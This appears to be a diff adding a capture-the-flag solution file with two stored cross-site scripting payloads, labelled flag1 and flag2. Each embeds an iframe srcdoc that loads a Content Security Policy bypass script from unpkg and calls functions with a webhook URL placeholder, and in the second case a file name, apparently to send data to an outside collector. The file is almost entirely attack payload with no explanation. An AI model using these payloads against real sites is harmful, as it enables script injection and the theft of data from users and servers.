@@ -1,0 +1,19 @@
+## flag1
+
+> title
+
+<iframe srcdoc="
+
+> content
+
+<script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script><script src='https://unpkg.com/:package@:version/:file'></script><br csp='exp_q1(`webhook_url`)'>"></iframe>
+
+## flag2
+
+> title
+
+<iframe srcdoc="
+
+> content
+
+<script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script><script src='https://unpkg.com/:package@:version/:file'></script><br csp='exp_q2(`webhook_url_id`, `file_name`)'>"></iframe>
